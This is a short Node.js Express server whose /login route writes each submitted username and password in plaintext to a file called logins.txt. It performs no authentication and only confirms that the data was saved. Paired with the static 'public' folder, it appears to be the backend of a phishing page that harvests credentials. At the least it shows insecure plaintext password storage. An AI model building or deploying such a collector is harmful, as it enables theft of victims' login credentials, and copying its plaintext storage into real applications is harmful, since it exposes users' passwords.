const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 4000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static('public'));

app.post('/login', (req, res) => {
    const { username, password } = req.body;
    const data = `Username: ${username}\nPassword: ${password}\n\n`;

    fs.appendFile('logins.txt', data, (err) => {
        if (err) {
            console.error(err);
            res.status(500).send('Error saving data');
            return;
        }
        res.send('Data saved successfully');
    });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
